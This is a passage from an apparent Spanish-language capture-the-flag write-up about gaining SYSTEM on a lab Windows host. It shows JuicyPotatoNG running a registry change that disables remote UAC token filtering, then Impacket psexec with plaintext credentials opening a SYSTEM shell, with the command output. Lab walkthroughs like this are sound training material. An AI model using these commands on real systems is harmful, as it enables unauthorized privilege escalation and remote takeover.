Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 10.10.10.116.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
```

Para solucionarlo, basta con retocar el registro del LocalAccountTokenFilterPolicy

```null
PS C:\Temp> .\JuicyPotatoNG.exe -t * -p cmd.exe -a "/c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"
```

```null
psexec.py 'WORKGROUP/rubbx:rubbx123$!@10.10.10.116'
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 10.10.10.116.....
[*] Found writable share ADMIN$
[*] Uploading file xhMvbgLt.exe
[*] Opening SVCManager on 10.10.10.116.....
[*] Creating service MVmB on 10.10.10.116.....
[*] Starting service MVmB.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.15063]
(c) 2017 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```
